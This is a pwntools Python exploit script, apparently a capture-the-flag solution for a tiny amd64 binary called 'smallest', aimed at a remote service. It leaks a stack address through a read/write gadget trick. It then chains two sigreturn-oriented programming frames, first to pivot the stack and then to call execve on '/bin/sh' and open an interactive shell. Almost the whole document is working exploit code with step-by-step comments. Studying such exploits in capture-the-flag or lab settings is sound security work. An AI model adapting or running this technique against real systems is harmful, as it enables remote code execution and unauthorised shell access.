from pwn import *

context.update(arch='amd64', os='linux', log_level='debug')

read_ = p64(0x4000b0)
syscall = p64(0x04000be)


#r = process('smallest')
r = remote('106.75.93.227', 20000)

log.info("Write 1024 bytes of rsp which leaks pointers to environ on the stack")
pause()
payload = read_ + read_ + read_
r.send(payload) # RET to 0x04000b0
sleep(3)
r.send(p8(0xbb)) # RET to 0x4000bb: mov rdi, rax
# rax is set to 1 (return value of read) at this point. Returning to 0x4000bb
# causes rdi to set to 1 and execute syscall. write will be called and 1024
# bytes of rsp will be written to STDOUT.
d = r.read(1024)
environ_addr = u64(d[16:16+8])
rsp = environ_addr - 6489 # Arbitrary offset below ELF auxiliary vector
log.info("rsp = " + hex(rsp))


log.info("Use sigreturn to rewrite rsp to a known address on the stack")
pause()
frame = SigreturnFrame(kernel='amd64')
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = rsp
frame.rdx = 10
frame.rsp = rsp
frame.rip = u64(read_)
payload = read_ + syscall + str(frame)
r.send(payload)
sleep(3)
# Set rax to 15 (SYS_rt_sigreturn) so that when 0x04000be is executed, it will
# call rt_sigreturn, read the frame from stack, and restores registers.
r.send(payload[8:8+15])


log.info("The rsp is set to a known adress. Write /bin/sh to the stack and call execve, again using rt_sigreturn")
pause()
frame = SigreturnFrame(kernel='amd64')
frame.rax = constants.SYS_execve
frame.rdi = rsp + 264
frame.rsi = frame.rdi + 7
frame.rdx = frame.rdi + 7
frame.rsp = rsp
frame.rip = u64(syscall)
payload = read_ + syscall + str(frame) + "/bin/sh\0"
r.send(payload)
sleep(3)
r.send(payload[8:8+15])


log.info("Now, the shell")

r.interactive()